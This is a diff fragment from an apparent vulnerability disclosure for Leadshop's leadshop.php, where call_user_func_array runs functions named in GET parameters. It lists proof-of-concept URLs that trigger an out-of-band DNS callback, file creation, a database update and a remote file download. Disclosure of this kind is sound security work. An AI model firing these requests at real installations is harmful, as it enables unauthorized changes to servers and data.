@@ -44,7 +44,7 @@ The vulnerability is in the leadshop/web/leadshop.php[27-61] file
 ```
 The ```call_user_func_array``` function is used directly, and $include, $data, and $meta receive get parameters, which allows us to run all functions in this file (parameters less than or equal to 2), such as:  
 HttpGet (http access: poc: ```https://demo.leadshop.vip/leadshop.php?include=HttpGet&meta=6nup69.dnslog.cn```),  
-ToMkdir (create folder: poc: ```https://demo.leadshop.vip/leadshop.php?include=ToMkdir&meta=1```),  
+ToMkdir (Create a file with content 1 and file name 1: poc: ```https://demo.leadshop.vip/leadshop.php?include=ToMkdir&meta=1&data=1```),  
 UpdateSql (perform database update: poc: ```https://demo.leadshop.vip/leadshop.php?include=UpdateSql```),  
 DownloadFile (download file: poc: 
 ```https://demo.leadshop.vip/leadshop.php?include=DownloadFile&meta=www.baidu.com/img/flexible/logo/pc/peak-result.png```),  
